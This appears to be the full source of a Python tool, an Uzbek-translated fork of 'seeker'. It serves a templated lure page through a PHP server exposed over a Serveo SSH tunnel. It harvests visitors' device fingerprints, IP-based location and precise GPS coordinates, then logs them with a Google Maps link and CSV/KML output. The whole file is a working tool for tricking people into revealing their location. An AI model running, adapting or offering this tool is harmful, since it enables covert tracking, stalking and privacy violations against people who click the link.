# Real author: thewhiteh4t...
# Some changed and translated by: UzbekMind...
# Script needs python version 3.0...
# Donate to changer: https://paypal.me/UzbekMind
#!/usr/bin/env python3...
# -*- coding: utf-8 -*-..

R = '\033[31m' # red
G = '\033[32m' # green
C = '\033[36m' # cyan
W = '\033[0m'  # white

from shutil import which

print(G + '[+]' + C + ' Ma`lumotlar tekshirilmoqda...' + W)
pkgs = ['python3', 'pip3', 'php', 'ssh']
inst = True
for pkg in pkgs:
	present = which(pkg)
	if present == None:
		print(R + '[-] ' + W + pkg + C + ' o`rnatilmagan! Iltimos o`rnating!')
		inst = False
	else:
		pass
if inst == False:
	exit()
else:
	pass

import os
import csv
import sys
import time
import json
import argparse
import requests
import subprocess as subp

parser = argparse.ArgumentParser()
parser.add_argument('-s', '--subdomain', help='Serveo uchun maxsus domen ( Mexanizmlashtirib )')
parser.add_argument('-k', '--kml', help='KML fayl nomini yetkazish ( Mexanizmlashtirib )')
parser.add_argument('-t', '--tunnel', help='Aloqa turini tanlash [ Mavjud : manual ]')
parser.add_argument('-p', '--port', type=int, default=8080, help='Web server uchun portni tanlash [ Sozlangan port : 8080 ]')

args = parser.parse_args()
subdom = args.subdomain
kml_fname = args.kml
tunnel_mode = args.tunnel
port = args.port

row = []
info = ''
result = ''
version = '1.2.5'

def banner():
	print (G +
	r'''
                        __
  ______  ____   ____  |  | __  ____ _______   __   __   ______
 /  ___/_/ __ \_/ __ \ |  |/ /_/ __ \\_  __ \ /  \ /  \ /___  /  
 \___ \ \  ___/\  ___/ |    < \  ___/ |  | \/ |  |_|  |   / /_
/____  > \___  >\___  >|__|_ \ \___  >|__|   <   ___  >  / ___ \
	 \/      \/     \/      \/     \/      \/   \/   \/   \/
     ''' + W)
	print('\n' + G + '[>]' + C + ' Created By : ' + W + 'thewhiteh4t' '/n' + G + '[>]' + C + ' Modified By : ' + R + ' UZBEKMIND ')
	print(G + '[>]' + C + ' Version    : ' + W + version + '\n')

def ver_check():
	print(G + '[+]' + C + ' Yangilanishlar tekshirilmoqda.....', end='')
	ver_url = 'https://raw.githubusercontent.com/thewhiteh4t/seeker/master/version.txt'
	try:
		ver_rqst = requests.get(ver_url)
		ver_sc = ver_rqst.status_code
		if ver_sc == 200:
			github_ver = ver_rqst.text
			github_ver = github_ver.strip()

			if version == github_ver:
				print(C + '[' + G + ' Eng yangi versiya ' + C +']' + '\n')
			else:
				print(C + '[' + G + ' Mavjud : {} '.format(github_ver) + C + ']' + '\n')
		else:
			print(C + '[' + R + ' Status : {} '.format(ver_sc) + C + ']' + '\n')
	except Exception as e:
		print('\n' + R + '[-]' + C + ' Mustasno : ' + W + str(e))

def tunnel_select():
	if tunnel_mode == None:
		serveo()
	elif tunnel_mode == 'manual':
		print(G + '[+]' + C + ' Serveo ga ulanmoqda, shaxsiy aloqani o`zingiz o`rnatishingiz mumkin...' + W + '\n')
	else:
		print(R + '[+]' + C + ' Aloqa turi xato tanlangan, tekshirib ko`ring Help [-h, --help]' + W + '\n')
		exit()

def template_select():
	global site, info, result
	print(G + '[+]' + C + ' Qaydnomani tanlang! : ' + W + '\n')
	
	with open('template/templates.json', 'r') as templ:
		templ_info = templ.read()
	
	templ_json = json.loads(templ_info)
	
	for item in templ_json['templates']:
		name = item['name']
		print(G + '[{}]'.format(templ_json['templates'].index(item)) + C + ' {}'.format(name) + W)
	
	selected = int(input(G + '[>] ' + W))
	
	try:
		site = templ_json['templates'][selected]['dir_name']
	except IndexError:
		print('\n' + R + '[-]' + C + ' Xato kiritdingiz!' + W + '\n')
		sys.exit()
	
	print('\n' + G + '[+]' + C + ' Qaydnomani {} Yuklanmoqda...'.format(templ_json['templates'][selected]['name']) + W)
	
	module = templ_json['templates'][selected]['module']
	if module == True:
		imp_file = templ_json['templates'][selected]['import_file']
		import importlib
		importlib.import_module('template.{}'.format(imp_file))
	else:
		pass

	info = 'template/{}/php/info.txt'.format(site)
	result = 'template/{}/php/result.txt'.format(site)

def serveo():
	global subdom
	flag = False

	print(G + '[+]' + C + ' Serveo statusi tekshirilmoqda...', end='')

	try:
		time.sleep(1)
		rqst = requests.get('https://serveo.net', timeout=5)
		sc = rqst.status_code
		if sc == 200:
			print(C + '[' + G + ' Online ' + C + ']' + W + '\n')
		else:
			print(C + '[' + R + 'Statusi : {}'.format(sc) + C + ']' + W + '\n')
			exit()
	except requests.ConnectionError:
		print(C + '[' + R + ' Offline ' + C + ']' + W + '\n')
		exit()
			
	print(G + '[+]' + C + ' Serveo havolasi yuklanmoqda...' + W + '\n')
	if subdom is None:
		with open('logs/serveo.txt', 'w') as tmpfile:
			proc = subp.Popen(['ssh', '-o', 'StrictHostKeyChecking=no', '-o', 'ServerAliveInterval=60', '-R', '80:localhost:{}'.format(port), 'serveo.net'], stdout=tmpfile, stderr=tmpfile, stdin=subp.PIPE)
	else:
		with open('logs/serveo.txt', 'w') as tmpfile:
			proc = subp.Popen(['ssh', '-o', 'StrictHostKeyChecking=no', '-o', 'ServerAliveInterval=60', '-R', '{}.serveo.net:80:localhost:{}'.format(subdom, port), 'serveo.net'], stdout=tmpfile, stderr=tmpfile, stdin=subp.PIPE)
	
	while True:
		with open('logs/serveo.txt', 'r') as tmpfile:
			try:
				stdout = tmpfile.readlines()
				if flag == False:
					for elem in stdout:
						if 'HTTP' in elem:
							elem = elem.split(' ')
							url = elem[4].strip()
							print(G + '[+]' + C + ' URL : ' + W + url + '\n')
							flag = True
						else:
							pass
				elif flag == True:
					break
			except Exception as e:
				print(e)
				pass
		time.sleep(2)

def server():
	print('\n' + G + '[+]' + C + ' Port : '+ W + str(port))
	print('\n' + G + '[+]' + C + ' PHP Server ishga tushirilmoqda......' + W, end='')
	with open('logs/php.log', 'w') as phplog:
		subp.Popen(['php', '-S', '0.0.0.0:{}'.format(port), '-t', 'template/{}/'.format(site)], stdout=phplog, stderr=phplog)
		time.sleep(3)
	try:
		php_rqst = requests.get('http://0.0.0.0:{}/index.html'.format(port))
		php_sc = php_rqst.status_code
		if php_sc == 200:
			print(C + '[' + G + ' Ishga tushirildi! ' + C + ']' + W)
		else:
			print(C + '[' + R + 'Statusi : {}'.format(php_sc) + C + ']' + W)
	except requests.ConnectionError:
		print(C + '[' + R + ' Uddalab bo`lmadi! ' + C + ']' + W)
		Quit()

def wait():
	printed = False
	while True:
		time.sleep(2)
		size = os.path.getsize(result)
		if size == 0 and printed == False:
			print('\n' + G + '[+]' + C + ' Havola ochilishini kutamiz...' + W + '\n')
			printed = True
		if size > 0:
			main()

def main():
	global info, result, row, var_lat, var_lon
	try:
		row = []
		with open (info, 'r') as file2:
			file2 = file2.read()
			json3 = json.loads(file2)
			for value in json3['dev']:

				var_os = value['os']
				var_platform = value['platform']
				try:
					var_cores = value['cores']
				except TypeError:
					var_cores = 'Not Available'
				var_ram = value['ram']
				var_vendor = value['vendor']
				var_render = value['render']
				var_res = value['wd'] + 'x' + value['ht']
				var_browser = value['browser']
				var_ip = value['ip']

				row.append(var_os)
				row.append(var_platform) 
				row.append(var_cores) 
				row.append(var_ram) 
				row.append(var_vendor)
				row.append(var_render)
				row.append(var_res)
				row.append(var_browser)
				row.append(var_ip)

				print(G + '[+]' + C + ' Qurilma haqida ma`lumot : ' + W + '\n')
				print(G + '[+]' + C + ' Operatsion tizim         : ' + W + var_os)
				print(G + '[+]' + C + ' Platforma   : ' + W + var_platform)
				print(G + '[+]' + C + ' Protsessor yadrolari  : ' + W + var_cores)
				print(G + '[+]' + C + ' RAM        : ' + W + var_ram)
				print(G + '[+]' + C + ' GPU sotuvchisi : ' + W + var_vendor)
				print(G + '[+]' + C + ' GPU        : ' + W + var_render)
				print(G + '[+]' + C + ' Qurilma ekrani hajmi : ' + W + var_res)
				print(G + '[+]' + C + ' Brauzer    : ' + W + var_browser)
				print(G + '[+]' + C + ' IP manzil  : ' + W + var_ip)

				rqst = requests.get('http://free.ipwhois.io/json/{}'.format(var_ip))
				sc = rqst.status_code

				if sc == 200:
					data = rqst.text
					data = json.loads(data)
					var_continent = str(data['continent'])
					var_country = str(data['country'])
					var_region = str(data['region'])
					var_city = str(data['city'])
					var_org = str(data['org'])
					var_isp = str(data['isp'])

					row.append(var_continent)
					row.append(var_country)
					row.append(var_region)
					row.append(var_city)
					row.append(var_org)
					row.append(var_isp)

					print(G + '[+]' + C + ' Qit`a  : ' + W + var_continent)
					print(G + '[+]' + C + ' Mamlakat   : ' + W + var_country)
					print(G + '[+]' + C + ' Tuman     : ' + W + var_region)
					print(G + '[+]' + C + ' Shahar       : ' + W + var_city)
					print(G + '[+]' + C + ' Tashkilot        : ' + W + var_org)
					print(G + '[+]' + C + ' Internet provayder        : ' + W + var_isp)
	except ValueError:
		pass
	
	try:
		with open (result, 'r') as file:
			file = file.read()
			json2 = json.loads(file)
			for value in json2['info']:
				var_lat = value['lat'] + ' deg'
				var_lon = value['lon'] + ' deg'
				var_acc = value['acc'] + ' m'

				var_alt = value['alt']
				if var_alt == '':
					var_alt = 'Aniqlanmadi'
				else:
					var_alt == value['alt'] + ' m'
				
				var_dir = value['dir']
				if var_dir == '':
					var_dir = 'Aniqlanmadi'
				else:
					var_dir = value['dir'] + ' deg'
				
				var_spd = value['spd']
				if var_spd == '':
					var_spd = 'Aniqlanmadi'
				else:
					var_spd = value['spd'] + ' m/s'

				row.append(var_lat)
				row.append(var_lon)
				row.append(var_acc)
				row.append(var_alt)
				row.append(var_dir)
				row.append(var_spd)

				print ('\n' + G + '[+]' + C + ' Manzili haqida : ' + W + '\n')
				print (G + '[+]' + C + ' Balandlik  : ' + W + var_lat)
				print (G + '[+]' + C + ' Uzunlik : ' + W + var_lon)
				print (G + '[+]' + C + ' Aniqlik : ' + W + var_acc)
				print (G + '[+]' + C + ' Dengiz satxidan balandigi  : ' + W + var_alt)
				print (G + '[+]' + C + ' Harakatlanishi : ' + W + var_dir)
				print (G + '[+]' + C + ' Terzligi    : ' + W + var_spd)
	except ValueError:
		error = file
		print ('\n' + R + '[-] ' + W + error)
		repeat()

	print ('\n' + G + '[+]' + C + ' Google Maps.................: ' + W + 'https://www.google.com/maps/place/' + var_lat.strip(' deg') + '+' + var_lon.strip(' deg'))
	
	if kml_fname is not None:
		kmlout(var_lat, var_lon)

	csvout()
	repeat()

def kmlout(var_lat, var_lon):
	with open('template/sample.kml', 'r') as kml_sample:
		kml_sample_data = kml_sample.read()

	kml_sample_data = kml_sample_data.replace('LONGITUDE', var_lon.strip(' deg'))
	kml_sample_data = kml_sample_data.replace('LATITUDE', var_lat.strip(' deg'))

	with open('{}.kml'.format(kml_fname), 'w') as kml_gen:
		kml_gen.write(kml_sample_data)

	print(G + '[+]' + C + ' KML Fayl generatlandi..........: ' + W + os.getcwd() + '/{}.kml'.format(kml_fname))

def csvout():
	global row
	with open('db/results.csv', 'a') as csvfile:
		writer = csv.writer(csvfile)
		writer.writerow(row)
	print(G + '[+]' + C + ' Ma`lumotlar saqlandi.: ' + W + os.getcwd() + '/db/results.csv')

def clear():
	global result
	with open (result, 'w+'): pass
	with open (info, 'w+'): pass

def repeat():
	clear()
	wait()
	main()

def Quit():
	global result
	with open (result, 'w+'): pass
	os.system('pkill php')
	exit()

try:
	banner()
	ver_check()
	tunnel_select()
	template_select()
	server()
	wait()
	main()

except KeyboardInterrupt:
	print ('\n' + R + '[!]' + R + ' Klaviatura sababli bekor qilindi.' + W)
	Quit()
